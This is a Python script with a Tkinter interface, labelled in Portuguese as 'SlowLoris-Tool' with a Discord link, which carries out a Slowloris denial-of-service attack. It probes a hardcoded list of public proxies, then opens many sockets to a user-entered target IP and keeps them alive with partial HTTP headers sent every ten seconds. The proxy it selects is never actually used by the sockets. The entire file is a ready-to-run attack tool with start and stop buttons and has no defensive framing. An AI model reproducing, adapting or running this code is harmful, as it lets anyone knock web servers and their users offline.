import requests
import socket
import random
import time
import threading
import tkinter as tk
from tkinter import scrolledtext

proxies = [
    "http://41.204.53.27:80", "http://103.253.103.50:80", "http://103.124.139.212:1080",
    "http://182.253.181.10:8080", "http://8.212.165.164:80", "http://47.91.115.179:80",
    "http://54.38.181.125:80", "http://43.134.121.40:3128", "http://43.133.59.220:3128",
    "http://81.200.149.178:80", "http://34.97.190.56:8561", "http://43.200.77.128:3128",
    "http://79.174.12.190:80", "http://202.6.233.133:80"
]

is_running = False
proxy = None
sockets = []

def log_message(message):
    log_area.insert(tk.END, f"{message}\n")
    log_area.see(tk.END)

def get_working_proxy():
    global proxy
    for p in proxies:
        try:
            log_message(f"Tentando conectar com o proxy: {p}")
            response = requests.get("http://www.google.com", proxies={"http": p, "https": p}, timeout=5)
            if response.status_code == 200:
                log_message(f"Proxy {p} está funcionando!")
                return p
        except Exception as e:
            log_message(f"Erro com o proxy {p}: {e}")
    log_message("Nenhum proxy disponível!")
    return None

def init_socket(target_ip):
    global proxy
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((target_ip, 80))
        sock.send(f"GET /?{random.randint(0, 1000)} HTTP/1.1\r\n".encode("utf-8"))
        sock.send(f"Host: {target_ip}\r\n".encode("utf-8"))
        sock.send("User-Agent: Spy/1.0\r\n".encode("utf-8"))
        sock.send("Accept-language: pt-BR\r\n".encode("utf-8"))
        sockets.append(sock)
        return sock
    except socket.error as e:
        log_message(f"Erro ao criar socket: {e}")
        return None

def slowloris_attack(target_ip):
    global is_running, proxy, sockets
    proxy = get_working_proxy()
    if proxy is None:
        log_message("Nenhum proxy funcional encontrado. Encerrando o ataque.")
        is_running = False
        return

    for _ in range(80):
        s = init_socket(target_ip)
        if s:
            log_message("Socket criado com sucesso.")
        else:
            log_message("Erro ao criar socket.")
    
    while is_running:
        log_message(f"Enviando cabeçalhos para {len(sockets)} sockets.")
        for s in list(sockets):
            try:
                s.send("X-a: keep-alive\r\n".encode("utf-8"))
            except socket.error:
                sockets.remove(s)
                log_message("Socket fechado, removido da lista.")
        
        for _ in range(5):
            if not is_running:
                break
            s = init_socket(target_ip)
            if s:
                log_message("Socket adicional criado.")

        time.sleep(10)

def start_attack():
    global is_running
    if is_running:
        log_message("O ataque já está em andamento!")
        return
    target_ip = ip_entry.get()

    if not target_ip:
        log_message("Insira um IP válido.")
        return

    is_running = True
    attack_thread = threading.Thread(target=slowloris_attack, args=(target_ip,))
    attack_thread.start()

def stop_attack():
    global is_running
    is_running = False
    for s in sockets:
        s.close()
    log_message("O ataque foi interrompido.")

window = tk.Tk()
window.title("SlowLoris-Tool - by catx e srxar")
window.configure(bg='black')
window.geometry("520x400")

tk.Label(window, text="IP DO ALVO:", fg='black', bg='white', font=('Courier', 14)).pack(pady=5)
ip_entry = tk.Entry(window, width=45, font=('Courier', 14))
ip_entry.pack(pady=5)

start_button = tk.Button(window, text="Iniciar Ataque", command=start_attack, bg='black', fg='white', font=('Courier', 12))
start_button.pack(pady=5)
stop_button = tk.Button(window, text="Parar Ataque", command=stop_attack, bg='black', fg='white', font=('Courier', 12))
stop_button.pack(pady=5)

log_area = scrolledtext.ScrolledText(window, width=60, height=15, bg='black', fg='white', font=('Courier', 10))
log_area.pack(pady=10)

link_label = tk.Label(window, text="Discord: https://discord.gg/k9PPasUz", fg='black', bg='white', cursor="hand2", font=('Courier', 10))
link_label.pack()

window.mainloop()
